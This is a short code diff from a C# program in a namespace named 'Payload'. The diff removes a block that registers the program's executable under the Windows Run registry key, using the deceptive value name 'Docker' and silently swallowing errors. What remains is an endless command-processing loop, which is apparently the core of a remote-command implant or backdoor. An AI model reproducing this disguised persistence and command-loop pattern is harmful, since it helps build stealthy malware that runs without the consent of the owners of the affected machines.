@@ -13,22 +13,6 @@ namespace Payload
     {
         static void Main(string[] args)
         {
-            try
-            {
-                string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
-                string fullName = Config.Instance.WorkSpaceDir + "\\" + Config.Instance.ExeName;
-                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(runKey, true))
-                {
-
-                    key.SetValue("Docker", fullName);
-                }
-            }
-            catch
-            {
-
-            }
-            
-
             while (true)
             {
                 Command.CommandManager.Instance.Run();
